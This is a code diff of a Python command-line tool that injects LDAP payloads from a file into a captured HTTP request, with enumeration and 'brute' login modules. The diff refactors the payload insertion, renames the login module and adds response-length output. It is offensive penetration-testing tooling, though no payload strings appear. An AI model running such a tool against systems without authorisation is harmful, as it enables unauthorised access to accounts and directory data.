@@ -11,6 +11,7 @@ import argparse
 from urllib.parse import urlparse, quote_plus, parse_qs
 import json
 import re
+import copy
 import urllib3
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
@@ -37,16 +38,18 @@ def send(args, url_str, header_json, data_json, proxy, method, form="json"):
   return r
 
 
-def inject(args, data_json, payload):
-  try:
-    temp = json.dumps(data_json).replace(args.insertionTag, payload)
-    data_json = json.loads(temp)
-  except:
-    print("\n[-] Warning: Payload processing failed in query {}".format(payload))
-  return data_json
+def inject(args, data, payload):
+  data_t = copy.deepcopy(data)
+  for key in data:
+    if isinstance(data[key], list):
+      for i in range(0, len(data[key])):
+        data_t[key][i] = data[key][i].replace(args.insertionTag, payload)
+    else:
+      data_t[key] = data[key].replace(args.insertionTag, payload)
+  return data_t
 
 
-def login(args, url_str, header_json, data_json, proxy, method, form="json"):
+def brute(args, url_str, header_json, data_json, proxy, method, form="json"):
   """ 
   url_str: string 
   header_json: json
@@ -55,7 +58,7 @@ def login(args, url_str, header_json, data_json, proxy, method, form="json"):
 
   with open("payloads.txt", 'r', encoding='utf-8') as infile:
     for line in infile:
-      query = "{}".format(line)
+      query = "{}".format(line).replace('\n','')
       # if base64 encoded:
       if args.encode == "base64":
         query = base64.b64encode(query.encode("utf-8")).decode("utf-8")
@@ -72,11 +75,9 @@ def login(args, url_str, header_json, data_json, proxy, method, form="json"):
 
       # prepare and send the request
       r = send(args, url_str, header_json_t, data_json_t, proxy, method, form)
-      print("\t\t\t\t\t -> {}\r{}".format(r.status_code, line.replace("\n", "")))
+      print("\t\t\t\t\t -> status {}, content-length {}\r{}".format(r.status_code, r.headers['content-length'], line.replace("\n", "")))
 
       # TODO: implement smart trigger
-      if "Cannot login" in r.text and not ("not valid" in r.text or "Malformed" in r.text):
-        break
 
       
 
@@ -131,7 +132,6 @@ def enum(args, url_str, header_json, data_json, proxy, method, form="json"):
 def extractKeyword(string):
   keyword = ""
   tags = ["[l,L]ogin", "[u,U]sername", "[u,U]ser", "Authorization", "[p,P]assword", "[p,P]ass", "pwd"]
-  #string = string.replace("'", "\"")
   keyword = ""
   for t in tags:
     try:
@@ -164,7 +164,7 @@ def calculateInsertionPoint(args, url_json, header_json, data_json):
   header_str = json.dumps(header_json)
   url_str = json.dumps(url_json)
   if args.insertionTag not in url_str and args.insertionTag not in data_str and args.insertionTag not in header_str:
-    print("[*] Insertion tag '*' not found in request. Searching for special keywords.")
+    print("[*] Insertion tag {} not found in request. Searching for special keywords.".format(args.insertionTag))
    
     print("[*] Searching header for possible insertion points.") 
     key = extractKeyword(header_str)
@@ -212,13 +212,13 @@ def main():
   print()
                                                            
 
-  parser = argparse.ArgumentParser(description="Test a login page for LDAP injection.")
+  parser = argparse.ArgumentParser(description="Test a LDAP injections.")
   parser.add_argument('-r', '--req', dest='requestFile', type=str, required=True, help="Request file. For example copied from Burp.")  
   parser.add_argument('-t', '--tag', dest="insertionTag", type=str, default='<>', help="Insertion point. Default *. Marks the spot for LDAP insertion.")
   parser.add_argument('--protocol', dest='protocol', type=str, default='https', help="The protocol to user: https or http. Default https.")
   parser.add_argument('--proxy', dest='proxy', type=str, default='', help="Use a proxy to connect to the target URL. Example: --proxy 127.0.0.1:8080")
   parser.add_argument('--encode', dest='encode', type=str, default='', help="Encode the payload: base64, url")
-  parser.add_argument('--module', dest='module', type=str, default='enum', help="The module to use: login, enum, dump (TODO)")
+  parser.add_argument('--module', dest='module', type=str, default='enum', help="The module to use: brute, enum, dump (TODO)")
   parser.add_argument('--method', dest='method', type=str, default='', help="Force using a given HTTP method.")
   parser.add_argument('--loglevel', dest='loglevel', default='WARNING', help="DEBUG, INFO, WARNING, ERROR")
   args = parser.parse_args()
@@ -269,8 +269,8 @@ def main():
   if args.module == 'enum':
     enum(args, url_str, header_json, data_json, proxy, method, form)
 
-  elif args.module == 'login':
-    login(args, url_str, header_json, data_json, proxy, method, form)
+  elif args.module == 'brute':
+    brute(args, url_str, header_json, data_json, proxy, method, form)
 
 if __name__ == '__main__':
   try:
